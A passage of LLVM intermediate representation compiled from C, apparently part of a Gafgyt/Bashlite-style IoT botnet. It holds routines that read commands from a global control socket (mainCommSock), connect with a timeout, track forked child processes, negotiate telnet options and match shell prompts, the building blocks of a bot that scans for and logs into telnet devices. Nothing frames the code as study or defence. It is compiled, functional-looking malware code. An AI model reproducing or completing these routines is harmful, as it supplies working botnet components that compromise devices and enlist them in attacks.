  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %114

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %18, align 4
  store i32 %113, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %98
  %115 = load i32, i32* %4, align 4
  ret i32 %115
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !3
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #2
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %136, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %137

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #2, !srcloc !4
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 64
  %63 = zext i32 %62 to i64
  %64 = shl i64 1, %63
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %66 = load i32, i32* %10, align 4
  %67 = sdiv i32 %66, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %70, %64
  store i64 %71, i64* %69, align 8
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %60
  br label %137

; <label>:77:                                     ; preds = %60
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %18, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8* %81, i8** %23, align 8
  %82 = load i32, i32* %10, align 4
  %83 = load i8*, i8** %23, align 8
  %84 = call i64 @recv(i32 %82, i8* %83, i64 1, i32 0)
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %19, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %77
  %89 = load i32, i32* %19, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %88, %77
  store i32 0, i32* %9, align 4
  br label %142

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %19, align 4
  %94 = load i32, i32* %18, align 4
  %95 = add nsw i32 %94, %93
  store i32 %95, i32* %18, align 4
  %96 = load i8*, i8** %23, align 8
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 255
  br i1 %99, label %100, label %122

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i64 @recv(i32 %101, i8* %103, i64 2, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %100
  store i32 0, i32* %9, align 4
  br label %142

